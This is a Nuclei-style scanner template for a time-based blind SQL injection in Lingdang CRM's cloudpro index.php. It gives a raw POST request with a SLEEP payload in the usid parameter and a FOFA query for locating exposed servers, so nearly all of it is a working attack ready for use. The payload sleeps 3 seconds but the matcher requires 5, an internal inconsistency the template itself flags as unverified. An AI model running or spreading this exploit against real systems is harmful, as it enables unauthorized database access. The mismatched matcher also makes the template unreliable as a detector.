id: poc-tfnxb057vy0xouiw
info:
  name: 灵当CRM cloudpro index.php存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tfnxb057vy0xouiw

    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: tfnxb057vy0xouiw
    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js"||body="http://localhost:8088/crm/index.php"&&body="ldcrm.base.js"||title="灵当CRM"
http:
- raw:
  - 'POST /crm/WeiXinApp/cloudpro/index.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36

    Connection: close

    Content-type:application/x-www-form-urlencoded

    Accept-Encoding: gzip


    action=getMyAccount&usid=1 AND (SELECT 1 FROM (SELECT SLEEP(3))a) -- q&my_cloudid=0'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
